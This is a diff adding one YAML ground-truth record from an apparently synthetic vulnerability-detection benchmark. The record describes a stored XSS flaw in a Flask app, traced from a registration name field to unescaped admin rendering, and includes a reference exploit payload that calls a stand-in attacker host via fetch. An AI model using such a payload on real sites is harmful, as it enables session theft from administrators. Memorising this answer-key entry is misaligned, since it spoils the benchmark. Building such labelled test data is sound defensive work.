@@ -1,0 +1,27 @@
+id: gt-448
+source_project: synthetic-phase30
+commit_hash: synthetic-no-commit
+cwe_id: CWE-79
+cwe_name: Cross-Site Scripting
+label: true_positive
+affected_files:
+- eval/synthetic/phase30/advanced/gt-448.py
+line_numbers:
+- 11
+taint_source: request.form["name"]
+taint_sink: render_template_string()
+taint_path:
+- the attacker stores a script payload in the registration name field
+- the application persists the attacker-controlled name for later reuse
+- the admin user list concatenates stored names into HTML without escaping
+- render_template_string(...) serves the stored script to an administrator browser
+complexity: multi_step
+exploitable: true
+reference_exploit: Register with name=<script>fetch("https://attacker")</script> and
+  wait for an admin to open the user list.
+reference_fix_commit: null
+notes: Stored XSS chain from registration to later admin rendering.
+discovery_method: synthetic
+language: python
+framework: flask
+taint_step_count: 4
